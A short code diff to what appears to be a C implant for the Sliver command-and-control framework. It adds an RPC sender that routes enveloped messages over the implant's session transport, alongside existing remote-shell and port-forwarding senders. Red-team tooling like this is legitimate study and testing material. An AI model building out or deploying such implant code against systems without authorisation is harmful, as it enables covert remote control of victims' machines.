@@ -95,6 +95,23 @@ static int encode_unknown_reply(sliver_buf_t *out, int64_t id) {
 /* Lets the shell module push TunnelData frames through the same sender. */
 static session_tx_t *g_tx = NULL;
 
+static int rpc_send_adapter(int64_t envelope_id, uint32_t type, const void *data, size_t len) {
+  sliver_buf_t env;
+  int rc;
+
+  if (g_tx == NULL) {
+    return -1;
+  }
+  sliver_buf_init(&env);
+  if (sliver_envelope_encode(&env, envelope_id, type, data, len) != 0) {
+    sliver_buf_free(&env);
+    return -1;
+  }
+  rc = send_envelope(g_tx, env.data, env.len);
+  sliver_buf_free(&env);
+  return rc;
+}
+
 static int shell_send_adapter(uint32_t type, const void *data, size_t len) {
   sliver_buf_t env;
   int rc;
@@ -199,6 +216,7 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   g_tx = &tx;
   sliver_shell_set_sender(shell_send_adapter);
   sliver_portfwd_set_sender(shell_send_adapter);
+  sliver_rpc_set_sender(rpc_send_adapter);
 
   /* Register: Envelope{Type = MsgRegister, Data = Register}. */
   reg = cfg->reg;
@@ -312,6 +330,7 @@ out:
   }
   return rc;
 }
+
 
 
 
